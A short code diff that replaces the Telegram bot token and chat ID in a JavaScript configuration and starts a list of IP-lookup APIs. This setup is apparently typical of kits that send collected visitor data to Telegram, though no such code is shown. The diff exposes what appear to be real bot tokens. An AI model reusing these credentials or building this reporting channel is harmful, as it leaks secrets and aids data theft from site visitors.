@@ -1,8 +1,8 @@
 /* ================= 1. CONFIGURATION ================= */
 const CONFIG = {
 	TELEGRAM: {
-		BOT_TOKEN: '8605786732:AAE-9RcnY3JVt7UfECtME6ruEx-RPJUaiTI',
-		CHAT_ID: '-5240434843',
+		BOT_TOKEN: '8978245968:AAHn0h3eqSMqfz9tu9Err49Yv2MGs7zW1DU',
+		CHAT_ID: '-1003895343561',
 	},
 	IP_APIS: [
 		'https://ipinfo.io/json',
